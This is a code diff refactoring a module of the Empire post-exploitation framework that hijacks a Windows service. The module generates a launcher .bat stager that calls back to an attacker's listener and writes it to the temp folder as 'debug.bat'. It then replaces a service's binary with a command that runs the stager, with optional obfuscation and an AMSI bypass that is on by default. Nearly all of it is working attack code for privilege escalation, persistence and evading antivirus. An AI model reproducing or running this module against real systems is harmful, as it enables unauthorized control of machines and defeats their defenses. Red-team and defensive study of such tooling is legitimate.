@@ -1,170 +1,68 @@
 from __future__ import print_function
 
-from builtins import object
 from builtins import str
-
+from builtins import object
 from empire.server.common import helpers
+from typing import Dict
+
+from empire.server.common.module_models import PydanticModule
 
 
 class Module(object):
-
-    def __init__(self, mainMenu, params=[]):
-
-        self.info = {
-            'Name': 'Install-ServiceBinary',
-
-            'Author': ['@harmj0y'],
-
-            'Description': ("Backs up a service's binary and replaces the original "
-                            "with a binary that launches a stager.bat."),
-
-            'Software': 'S0194',
-
-            'Techniques': ['T1087', 'T1038', 'T1031', 'T1034', 'T1057', 'T1012'],
-
-            'Background' : True,
-
-            'OutputExtension' : None,
-            
-            'NeedsAdmin' : False,
-
-            'OpsecSafe' : False,
-            
-            'Language' : 'powershell',
-
-            'MinLanguageVersion' : '2',
-            
-            'Comments': [
-                'https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp'
-            ]
-        }
-
-        # any options needed by the module, settable during runtime
-        self.options = {
-            # format:
-            #   value_name : {description, required, default_value}
-            'Agent' : {
-                'Description'   :   'Agent to run module on.',
-                'Required'      :   True,
-                'Value'         :   ''
-            },
-            'ServiceName' : {
-                'Description'   :   "The service name to manipulate.",
-                'Required'      :   True,
-                'Value'         :   ''
-            },
-            'Delete' : {
-                'Description'   :   "Switch. Have the launcher.bat delete itself after running.",
-                'Required'      :   False,
-                'Value'         :   'True'
-            },
-            'Listener' : {
-                'Description'   :   'Listener to use.',
-                'Required'      :   True,
-                'Value'         :   ''
-            },
-            'Obfuscate': {
-                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
-                'Required': False,
-                'Value': 'False'
-            },
-            'ObfuscateCommand': {
-                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
-                'Required': False,
-                'Value': r'Token\All\1'
-            },
-            'AMSIBypass': {
-                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
-                'Required': False,
-                'Value': 'True'
-            },
-            'AMSIBypass2': {
-                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
-                'Required': False,
-                'Value': 'False'
-            },
-            'UserAgent' : {
-                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
-            },
-            'Proxy' : {
-                'Description'   :   'Proxy to use for request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
-            },
-            'ProxyCreds' : {
-                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
-            }
-        }
-
-        # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
-        self.mainMenu = mainMenu
-        
-        for param in params:
-            # parameter format is [Name, Value]
-            option, value = param
-            if option in self.options:
-                self.options[option]['Value'] = value
-
-
-    def generate(self, obfuscate=False, obfuscationCommand=""):
-
+    @staticmethod
+    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):      
         # read in the common powerup.ps1 module source code
-        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/PowerUp.ps1"
+        module_source = main_menu.installPath + "/data/module_source/privesc/PowerUp.ps1"
         if obfuscate:
-            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
-            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
+            helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
+            module_source = module_source.replace("module_source", "obfuscated_module_source")
         try:
-            f = open(moduleSource, 'r')
+            f = open(module_source, 'r')
         except:
-            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
+            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
             return ""
 
-        moduleCode = f.read()
+        module_code = f.read()
         f.close()
 
-        serviceName = self.options['ServiceName']['Value']
+        service_name = params['ServiceName']
 
         # # get just the code needed for the specified function
         # script = helpers.generate_dynamic_powershell_script(moduleCode, "Write-ServiceEXECMD")
-        script = moduleCode
+        script = module_code
 
         # generate the .bat launcher code to write out to the specified location
-        l = self.mainMenu.stagers.stagers['windows/launcher_bat']
-        l.options['Listener']['Value'] = self.options['Listener']['Value']
-        l.options['UserAgent']['Value'] = self.options['UserAgent']['Value']
-        l.options['Proxy']['Value'] = self.options['Proxy']['Value']
-        l.options['ProxyCreds']['Value'] = self.options['ProxyCreds']['Value']
-        l.options['ObfuscateCommand']['Value'] = self.options['ObfuscateCommand']['Value']
-        l.options['Obfuscate']['Value']  = self.options['Obfuscate']['Value']
-        l.options['AMSIBypass']['Value'] = self.options['AMSIBypass']['Value']
-        l.options['AMSIBypass2']['Value'] = self.options['AMSIBypass2']['Value']
-        if self.options['Delete']['Value'].lower() == "true":
-            l.options['Delete']['Value'] = "True"
+        launcher = main_menu.stagers.stagers['windows/launcher_bat']
+        launcher.options['Listener'] = params['Listener']
+        launcher.options['UserAgent'] = params['UserAgent']
+        launcher.options['Proxy'] = params['Proxy']
+        launcher.options['ProxyCreds'] = params['ProxyCreds']
+        launcher.options['ObfuscateCommand'] = params['ObfuscateCommand']
+        launcher.options['Obfuscate'] = params['Obfuscate']
+        launcher.options['AMSIBypass'] = params['AMSIBypass']
+        launcher.options['AMSIBypass2'] = params['AMSIBypass2']
+        if params['Delete'].lower() == "true":
+            launcher.options['Delete'] = "True"
         else:
-            l.options['Delete']['Value'] = "False"
+            launcher.options['Delete'] = "False"
 
-        launcherCode = l.generate()
+        launcher_code = launcher.generate()
 
         # PowerShell code to write the launcher.bat out
-        scriptEnd = ";$tempLoc = \"$env:temp\\debug.bat\""
-        scriptEnd += "\n$batCode = @\"\n" + launcherCode + "\"@\n"
-        scriptEnd += "$batCode | Out-File -Encoding ASCII $tempLoc ;\n"
-        scriptEnd += "\"Launcher bat written to $tempLoc `n\";\n"
+        script_end = ";$tempLoc = \"$env:temp\\debug.bat\""
+        script_end += "\n$batCode = @\"\n" + launcher_code + "\"@\n"
+        script_end += "$batCode | Out-File -Encoding ASCII $tempLoc ;\n"
+        script_end += "\"Launcher bat written to $tempLoc `n\";\n"
   
-        if launcherCode == "":
+        if launcher_code == "":
             print(helpers.color("[!] Error in launcher .bat generation."))
             return ""
         else:
-            scriptEnd += "\nInstall-ServiceBinary -ServiceName \""+str(serviceName)+"\" -Command \"C:\\Windows\\System32\\cmd.exe /C $tempLoc\""    
+            script_end += "\nInstall-ServiceBinary -ServiceName \""+str(service_name)+"\" -Command \"C:\\Windows\\System32\\cmd.exe /C $tempLoc\""
 
         if obfuscate:
-            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
-        script += scriptEnd
+            script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=obfuscation_command)
+        script += script_end
         script = helpers.keyword_obfuscation(script)
 
         return script
